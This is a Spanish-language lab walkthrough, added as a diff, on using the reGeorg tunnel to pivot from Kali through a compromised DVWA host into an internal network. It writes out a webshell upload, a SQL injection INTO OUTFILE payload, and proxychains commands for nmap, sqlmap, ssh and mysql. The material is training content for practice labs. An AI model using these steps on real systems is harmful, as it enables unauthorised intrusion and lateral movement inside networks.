@@ -1,0 +1,177 @@
+================================================================
+  reGeorg - HTTP Tunneling para Pivoting en Redes NAT
+  D1n0 | Ethical Hacking Lab
+================================================================
+
+----------------------------------------------------------------
+TOPOLOGIA DEL LABORATORIO
+----------------------------------------------------------------
+
+  [ Kali Linux ] <--NAT1--> [ DVWA ] <--NAT2--> [ WebForPentesters ]
+       |                    (pivot)                   (objetivo)
+       |                       |
+       +--- reGeorg client     +--- tunnel.php (webshell)
+
+  Problema: Kali no tiene acceso directo a NAT2.
+  Solucion: Tunelizar trafico a traves de DVWA usando reGeorg.
+
+----------------------------------------------------------------
+QUE ES reGeorg
+----------------------------------------------------------------
+
+reGeorg crea un tunel SOCKS4 a traves de un webshell PHP subido
+en el servidor comprometido (DVWA). Combinado con proxychains,
+cualquier herramienta en Kali puede enrutar su trafico hacia
+la red interna (NAT2) como si estuviera dentro del servidor.
+
+Flujo:
+  Kali --> reGeorg.py (SOCKS4:8888) --> tunnel.php en DVWA --> NAT2
+
+----------------------------------------------------------------
+INSTALACION
+----------------------------------------------------------------
+
+  git clone https://github.com/sensepost/reGeorg.git
+  cd reGeorg
+
+  # Webshells disponibles en tunnels/
+  ls tunnels/
+    tunnel.php   <-- para PHP (DVWA)
+    tunnel.ashx  <-- ASP.NET
+    tunnel.jsp   <-- Java
+
+  # Ignorar del repo propio
+  echo "reGeorg/" >> ../.gitignore
+
+----------------------------------------------------------------
+PASO 1 - Subir tunnel.php a DVWA
+----------------------------------------------------------------
+
+Opcion A: File Upload en DVWA
+  Navega a DVWA > File Upload > sube reGeorg/tunnels/tunnel.php
+  URL resultante: http://<IP_DVWA>/dvwa/hackable/uploads/tunnel.php
+
+Opcion B: Via SQLi con INTO OUTFILE (requiere FILE privilege)
+  ' UNION SELECT '<?php include("tunnel.php"); ?>'
+    INTO OUTFILE '/var/www/html/dvwa/hackable/uploads/tunnel.php'-- -
+
+Verificar que esta accesible:
+  curl http://<IP_DVWA>/dvwa/hackable/uploads/tunnel.php
+
+  Respuesta esperada --> Georg says, 'All seems fine'
+
+----------------------------------------------------------------
+PASO 2 - Lanzar el cliente reGeorg
+----------------------------------------------------------------
+
+  python2.7 reGeorg.py -u http://<IP_DVWA>/dvwa/hackable/uploads/tunnel.php -p 8888
+
+  Opciones:
+    -u   URL completa al tunnel.php subido en DVWA
+    -p   Puerto local donde escucha el proxy SOCKS4 (default: 8888)
+    --loglevel DEBUG   Para ver mas detalle (DEBUG / INFO / WARNING)
+
+  Ejemplo real:
+    python2.7 reGeorg.py -u http://192.168.56.101/dvwa/hackable/uploads/tunnel.php -p 8888
+
+  IMPORTANTE: Deja esta terminal abierta. El tunel vive mientras
+  el proceso esta corriendo.
+
+----------------------------------------------------------------
+PASO 3 - Configurar proxychains4
+----------------------------------------------------------------
+
+  # Copiar config a tu directorio de trabajo
+  cp /etc/proxychains4.conf ./proxychains4.conf
+
+  # Editar
+  nano proxychains4.conf
+
+  Cambios necesarios:
+    1. Asegurate de que "dynamic_chain" esta descomentado
+    2. Comenta "strict_chain" si estaba activo
+    3. Al final del archivo, en [ProxyList], pon:
+
+       [ProxyList]
+       socks4  127.0.0.1  8888
+
+  El puerto 8888 debe coincidir con el -p que pasaste a reGeorg.
+
+----------------------------------------------------------------
+PASO 4 - Usar proxychains con cualquier binario
+----------------------------------------------------------------
+
+  Sintaxis:
+    proxychains -f ./proxychains4.conf <binario> [opciones]
+
+  Ejemplos:
+    proxychains -f ./proxychains4.conf nmap -sT -p 22,80,3306 <IP_NAT2>
+    proxychains -f ./proxychains4.conf curl http://<IP_NAT2>/
+    proxychains -f ./proxychains4.conf ssh user@<IP_NAT2>
+    proxychains -f ./proxychains4.conf sqlmap -u "http://<IP_NAT2>/vuln.php?id=1"
+
+  NOTA: nmap con proxychains requiere -sT (TCP connect scan).
+  Los scans SYN (-sS) no funcionan a traves de SOCKS.
+
+----------------------------------------------------------------
+PASO 5 - Prueba de conectividad con MySQL (en este caso)
+----------------------------------------------------------------
+
+  proxychains -f ./proxychains4.conf mysql -h <IP_NAT2> -u root -p --ssl=False
+
+  Con puerto explicito:
+    proxychains -f ./proxychains4.conf mysql -h <IP_NAT2> -P 3306 -u root -p --ssl=False
+
+  Exito --> aparece el prompt:  mysql>
+
+----------------------------------------------------------------
+COMPROBACION RÁPIDA (cheatsheet)
+----------------------------------------------------------------
+
+  # 1. Verificar webshell
+  curl http://<DVWA>/hackable/uploads/tunnel.php
+    --> "Georg says, 'All seems fine'"
+
+  # 2. Iniciar tunel (terminal separada)
+  python2.7 reGeorg.py -u http://<DVWA>/hackable/uploads/tunnel.php -p 8888
+
+  # 3. Preparar proxychains
+  cp /etc/proxychains4.conf ./proxychains4.conf
+  # editar: socks4 127.0.0.1 8888 en [ProxyList]
+
+  # 4. Cualquier herramienta
+  proxychains -f ./proxychains4.conf <herramienta> <opciones>
+
+  # 5. Prueba MySQL
+  proxychains -f ./proxychains4.conf mysql -h <IP_NAT2> -u root -p --ssl=False
+
+----------------------------------------------------------------
+SOLUCION DE PROBLEMAS
+----------------------------------------------------------------
+
+Error: "Georg says, file not found"
+  --> El path al .php es incorrecto. Verifica la URL con curl.
+
+Error: Connection refused en 127.0.0.1:8888
+  --> reGeorg.py no esta corriendo. Lanzalo en otra terminal.
+
+Error: proxychains can't connect
+  --> El puerto en proxychains4.conf no coincide con -p de reGeorg.
+
+Error: MySQL ERROR 2003 (Can't connect)
+  --> Tunel ok pero MySQL rechaza conexion remota. Usa --ssl=False
+      y verifica puerto 3306 con: proxychains nmap -sT -p 3306 <IP>
+
+Error: tunnel.php devuelve 403/404
+  --> Ruta incorrecta o permisos insuficientes en el servidor.
+      Prueba la ruta exacta en DVWA: /dvwa/hackable/uploads/
+
+----------------------------------------------------------------
+NOTA DE SEGURIDAD
+----------------------------------------------------------------
+
+  Esta guia es para uso exclusivo en entornos de laboratorio
+  controlados (DVWA, PentesterLab). El uso de estas tecnicas
+  en sistemas sin autorizacion explicita es ilegal.
+
+================================================================
